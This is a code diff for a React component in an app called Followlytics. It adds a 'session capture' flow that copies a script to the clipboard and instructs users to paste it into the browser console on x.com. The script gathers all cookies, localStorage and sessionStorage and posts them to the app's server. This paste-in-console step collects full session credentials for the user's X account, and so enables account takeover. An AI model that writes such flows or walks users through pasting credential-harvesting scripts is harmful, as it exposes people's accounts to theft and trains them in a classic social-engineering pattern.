@@ -34,24 +34,137 @@ export default function XSessionCaptureSimple() {
     }
   }
 
+  const [showCaptureInstructions, setShowCaptureInstructions] = useState(false)
+
   const openXForSessionCapture = () => {
     // Open X.com in a new tab with instructions
     const newTab = window.open('https://x.com', '_blank')
     
     if (newTab) {
-      // Show instructions to user
-      alert(`
-🔐 X Session Capture Instructions:
-
-1. Login to X.com in the new tab that just opened
-2. Navigate to your profile or followers page
-3. Come back to this tab
-4. Click "I'm Logged In" button below
-
-This allows us to capture your session for follower scanning.
-      `)
+      setShowCaptureInstructions(true)
     } else {
       alert('Please allow popups and try again.')
+    }
+  }
+
+  const confirmLoggedIn = async () => {
+    if (!user) return
+
+    try {
+      setLoading(true)
+      
+      // Show the console script for the user to run on X.com
+      const script = `
+// STEP 1: Make sure you're on x.com and logged in
+if (!window.location.hostname.includes('x.com') && !window.location.hostname.includes('twitter.com')) {
+  alert('❌ Please run this on x.com');
+} else {
+  // STEP 2: Capture session data
+  console.log('🔐 Capturing X session...');
+  
+  const cookies = {};
+  document.cookie.split(';').forEach(cookie => {
+    const [name, value] = cookie.trim().split('=');
+    if (name && value) cookies[name] = value;
+  });
+  
+  const localStorage = {};
+  for (let i = 0; i < window.localStorage.length; i++) {
+    const key = window.localStorage.key(i);
+    localStorage[key] = window.localStorage.getItem(key);
+  }
+  
+  const sessionStorage = {};
+  for (let i = 0; i < window.sessionStorage.length; i++) {
+    const key = window.sessionStorage.key(i);
+    sessionStorage[key] = window.sessionStorage.getItem(key);
+  }
+  
+  const sessionData = {
+    cookies,
+    localStorage,
+    sessionStorage,
+    userAgent: navigator.userAgent,
+    url: window.location.href,
+    timestamp: new Date().toISOString()
+  };
+  
+  // STEP 3: Send to Followlytics
+  fetch('https://followlytics-zeta.vercel.app/api/auth/capture-x-session-direct', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ sessionData, userId: '${user.uid}' })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.success) {
+      console.log('✅ Session captured successfully!');
+      alert('✅ X session captured! You can close this tab and return to Followlytics.');
+    } else {
+      console.error('❌ Capture failed:', data.error);
+      alert('❌ Capture failed: ' + data.error);
+    }
+  })
+  .catch(error => {
+    console.error('❌ Network error:', error);
+    alert('❌ Network error: ' + error.message);
+  });
+}
+      `
+
+      // Copy script to clipboard and show instructions
+      try {
+        await navigator.clipboard.writeText(script)
+        alert(`
+✅ Script copied to clipboard!
+
+Now:
+1. Go to the X.com tab you opened
+2. Make sure you're logged in
+3. Open browser console (F12)
+4. Paste the script (Ctrl+V) and press Enter
+5. Wait for "✅ Session captured!" message
+6. Come back here and refresh
+
+The script is ready in your clipboard!
+        `)
+      } catch (e) {
+        // Fallback if clipboard API fails
+        const scriptWindow = window.open('', '_blank', 'width=700,height=500')
+        if (scriptWindow) {
+          scriptWindow.document.write(`
+            <html>
+              <head><title>X Session Capture Script</title></head>
+              <body style="font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5;">
+                <div style="max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+                  <h2 style="color: #1d4ed8;">🔐 X Session Capture Script</h2>
+                  <div style="background: #fef3c7; padding: 15px; border-radius: 6px; margin: 15px 0;">
+                    <strong>📋 Instructions:</strong>
+                    <ol style="margin: 10px 0; padding-left: 20px;">
+                      <li>Go to X.com and make sure you're logged in</li>
+                      <li>Open browser console (F12)</li>
+                      <li>Copy and paste this entire script:</li>
+                    </ol>
+                  </div>
+                  <textarea style="width: 100%; height: 300px; font-family: monospace; font-size: 12px; padding: 10px; border: 1px solid #ccc; border-radius: 4px;" readonly onclick="this.select()">${script}</textarea>
+                  <div style="background: #dcfce7; padding: 15px; border-radius: 6px; margin: 15px 0;">
+                    <strong>✅ After running the script:</strong>
+                    <p style="margin: 5px 0;">You'll see "✅ Session captured!" - then return to Followlytics and refresh the page.</p>
+                  </div>
+                </div>
+              </body>
+            </html>
+          `)
+        }
+      }
+
+      setShowCaptureInstructions(false)
+      
+    } catch (error) {
+      console.error('Error in session capture:', error)
+      alert('Error preparing session capture. Please try again.')
+    } finally {
+      setLoading(false)
     }
   }
 
@@ -199,20 +312,52 @@ Would you like to see the script to copy?
           </p>
         </div>
         <div className="flex space-x-2">
-          <button
-            onClick={openXForSessionCapture}
-            className="bg-blue-600 hover:bg-blue-700 text-white text-sm px-3 py-2 rounded"
-          >
-            🌐 Open X.com
-          </button>
-          <button
-            onClick={captureSessionManually}
-            className="bg-gray-600 hover:bg-gray-700 text-white text-sm px-3 py-2 rounded"
-          >
-            📋 Manual Capture
-          </button>
+          {!showCaptureInstructions ? (
+            <>
+              <button
+                onClick={openXForSessionCapture}
+                className="bg-blue-600 hover:bg-blue-700 text-white text-sm px-3 py-2 rounded"
+              >
+                🌐 Open X.com
+              </button>
+              <button
+                onClick={captureSessionManually}
+                className="bg-gray-600 hover:bg-gray-700 text-white text-sm px-3 py-2 rounded"
+              >
+                📋 Manual Capture
+              </button>
+            </>
+          ) : (
+            <button
+              onClick={confirmLoggedIn}
+              disabled={loading}
+              className="bg-green-600 hover:bg-green-700 disabled:bg-green-400 text-white text-sm px-4 py-2 rounded"
+            >
+              {loading ? '🔄 Processing...' : '✅ I\'m Logged In'}
+            </button>
+          )}
         </div>
       </div>
+      
+      {showCaptureInstructions && (
+        <div className="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded">
+          <p className="text-sm text-yellow-800">
+            <strong>📋 Next Steps:</strong>
+          </p>
+          <ol className="text-sm text-yellow-700 mt-1 list-decimal list-inside space-y-1">
+            <li>Make sure you're logged into X.com in the new tab</li>
+            <li>Navigate to your profile or followers page</li>
+            <li>Come back here and click "✅ I'm Logged In"</li>
+            <li>Follow the console script instructions</li>
+          </ol>
+          <button
+            onClick={() => setShowCaptureInstructions(false)}
+            className="mt-2 text-yellow-600 hover:text-yellow-700 text-sm underline"
+          >
+            Cancel
+          </button>
+        </div>
+      )}
     </div>
   )
 }
